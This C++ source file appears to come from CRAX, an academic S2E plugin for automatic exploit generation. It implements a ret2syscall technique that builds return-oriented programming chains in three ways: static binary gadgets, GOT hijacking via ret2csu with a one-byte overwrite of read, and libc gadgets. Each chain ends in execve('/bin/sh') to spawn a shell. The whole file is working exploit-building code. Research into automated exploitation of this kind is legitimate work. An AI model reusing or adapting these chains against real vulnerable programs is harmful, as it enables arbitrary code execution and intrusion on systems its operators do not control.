// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Exploit.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>

#include <cassert>
#include <thread>
#include <vector>

#include "Ret2syscall.h"

namespace s2e::plugins::crax {

Ret2syscall::Ret2syscall()
    : Technique(),
      m_syscallGadget(),
      m_strategy() {
    m_hasPopulatedRequiredGadgets = false;

    std::thread([this]() {
        const Exploit &exploit = g_crax->getExploit();
        const ELF &elf = exploit.getElf();
        const ELF &libc = exploit.getLibc();

        if (exploit.resolveGadget(elf, "pop rax ; ret") &&
            exploit.resolveGadget(elf, "pop rdi ; ret") &&
            exploit.resolveGadget(elf, "pop rsi ; ret") &&
            exploit.resolveGadget(elf, "pop rdx ; ret") &&
            exploit.resolveGadget(elf, "syscall")) {
            m_strategy = Strategy::STATIC_ROP;
            m_requiredGadgets.push_back(std::make_pair(&elf, "pop rax ; ret"));
            m_requiredGadgets.push_back(std::make_pair(&elf, "pop rdi ; ret"));
            m_requiredGadgets.push_back(std::make_pair(&elf, "pop rsi ; ret"));
            m_requiredGadgets.push_back(std::make_pair(&elf, "pop rdx ; ret"));
            m_requiredGadgets.push_back(std::make_pair(&elf, "syscall"));

        } else if (!elf.checksec.hasFullRELRO && elf.hasSymbol("read")) {
            m_strategy = Strategy::GOT_HIJACKING_ROP;
            m_syscallGadget = BaseOffsetExpr::create<BaseType::SYM>(elf, "read");

        } else {
            m_strategy = Strategy::LIBC_ROP;
            m_requiredGadgets.push_back(std::make_pair(&libc, "pop rax ; ret"));
            m_requiredGadgets.push_back(std::make_pair(&libc, "pop rdi ; ret"));
            m_requiredGadgets.push_back(std::make_pair(&libc, "pop rsi ; ret"));
            m_requiredGadgets.push_back(std::make_pair(&libc, "pop rdx ; ret"));
            m_requiredGadgets.push_back(std::make_pair(&libc, "syscall"));
        }

        m_hasPopulatedRequiredGadgets = true;
    }).detach();
}


std::vector<RopPayload> Ret2syscall::getRopPayloadList() const {
    switch (m_strategy) {
        case Strategy::STATIC_ROP:
            return getRopPayloadListUsingStaticRop();
        case Strategy::GOT_HIJACKING_ROP:
            return getRopPayloadListUsingGotHijackingRop();
        case Strategy::LIBC_ROP:
            [[fallthrough]];
        default:
            return getRopPayloadListUsingLibcRop();
    }
}

std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingStaticRop() const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    // sys_read(0, elf.bss(), 59)
    // reading "/bin/sh".ljust(59, b'\x00') to elf.bss()
    RopPayload part1 = {
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rax ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdi ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rsi ; ret")),
        BaseOffsetExpr::create<BaseType::BSS>(elf),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdx ; ret")),
        ConstantExpr::create(59, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "syscall")),
    };

    // sys_execve("/bin/sh", 0, 0)
    RopPayload part2 = {
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rax ; ret")),
        ConstantExpr::create(59, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdi ; ret")),
        BaseOffsetExpr::create<BaseType::BSS>(elf),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rsi ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rdx ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "syscall")),
    };

    RopPayload ret1;
    RopPayload ret2;

    ret1.reserve(1 + part1.size() + part2.size());
    ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
    ret1.insert(ret1.end(), part1.begin(), part1.end());
    ret1.insert(ret1.end(), part2.begin(), part2.end());
    ret2 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };

    return { ret1, ret2 };
}

std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
    Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();
    const ELF &libc = exploit.getLibc();

    // Search libc of "/bin/sh".
    S2EExecutionState *state = g_crax->getCurrentState();
    std::string needleStr = "/bin/sh";
    std::vector<uint8_t> needle(needleStr.begin(), needleStr.end());
    std::vector<uint64_t> addresses = mem(state).search(needle);
    assert(addresses.size() && "No /bin/sh in the whole va_space?");

    // Determine if the string "/bin/sh" is within ELF or libc.so.6.
    uint64_t binshAddr = addresses[0];
    uint64_t base = mem(state).vmmap().getModuleBaseAddress(binshAddr);

    const ELF *target = nullptr;
    uint64_t binshOffset = 0;

    if (base == ELF::getDefaultElfBase()) {  // within ELF (no PIE)
        target = &elf;
        binshOffset = binshAddr;
    } else if (base == elf.getBase()) {  // within ELF (PIE)
        target = &elf;
        binshOffset = binshAddr - elf.getBase();
    } else if (base == libc.getBase()) {  // within libc.so.6
        target = &libc;
        binshOffset = binshAddr - libc.getBase();
    }

    assert(target && "No /bin/sh in both target ELF and libc.so.6?");

    // Register "/bin/sh" in libc as a script's variable.
    std::string binshVarName = Exploit::toVarName(target->getFilename()) + "_binsh";
    exploit.registerSymbol(binshVarName, binshOffset);

    // sys_execve("/bin/sh", 0, 0)
    RopPayload payload = {
        ConstantExpr::create(0, Expr::Int64),  // RBP
        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rax ; ret")),
        ConstantExpr::create(59, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rdi ; ret")),
        BaseOffsetExpr::create<BaseType::VAR>(*target, binshVarName),
        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rsi ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rdx ; ret")),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "syscall")),
    };

    return { payload };
}

std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingGotHijackingRop() const {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = g_crax->getTechnique<Ret2csu>();
    assert(ret2csu);

    // read(0, elf.got['read'], 1), setting RAX to 1.
    RopPayload part1 = ret2csu->getRopPayloadList(
        m_syscallGadget,
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::GOT>(elf, "read"),
        ConstantExpr::create(1, Expr::Int64))[0];

    // syscall<1>(1, 0, 0), setting RAX to 0.
    RopPayload part2 = ret2csu->getRopPayloadList(
        m_syscallGadget,
        ConstantExpr::create(1, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64))[0];

    // syscall<0>(0, elf.bss(), 59),
    // reading "/bin/sh".ljust(59, b'\x00') to elf.bss()
    RopPayload part3 = ret2csu->getRopPayloadList(
        m_syscallGadget,
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create<BaseType::BSS>(elf),
        ConstantExpr::create(59, Expr::Int64))[0];

    // syscall<59>("/bin/sh", 0, 0),
    // i.e. sys_execve("/bin/sh", NULL, NULL)
    RopPayload part4 = ret2csu->getRopPayloadList(
        m_syscallGadget,
        BaseOffsetExpr::create<BaseType::BSS>(elf),
        ConstantExpr::create(0, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64))[0];

    RopPayload ret1;
    RopPayload ret2;
    RopPayload ret3;

    ret1.reserve(1 + part1.size() + part2.size() + part3.size() + part4.size());
    ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
    ret1.insert(ret1.end(), part1.begin(), part1.end());
    ret1.insert(ret1.end(), part2.begin(), part2.end());
    ret1.insert(ret1.end(), part3.begin(), part3.end());
    ret1.insert(ret1.end(), part4.begin(), part4.end());
    ret2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLibcReadSyscallOffsetLsb() }) };
    ret3 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };

    return { ret1, ret2, ret3 };
}

uint8_t Ret2syscall::getLibcReadSyscallOffsetLsb() const {
    const ELF &libc = g_crax->getExploit().getLibc();

    // Get __read() info from libc.
    const Function &f = libc.functions().at("__read");

    std::vector<uint8_t> code(f.size);
    std::ifstream ifs(libc.getFilename(), std::ios::binary);
    ifs.seekg(f.address, std::ios::beg);
    ifs.read(reinterpret_cast<char*>(code.data()), f.size);

    uint64_t syscallOffset = -1;
    for (auto i : disas().disasm(code, f.address)) {
        if (i.mnemonic == "syscall") {
            syscallOffset = i.address;
            assert((syscallOffset & 0xff00) == (f.address & 0xff00));
            break;
        }
    }
    return syscallOffset & 0xff;
}

}  // namespace s2e::plugins::crax
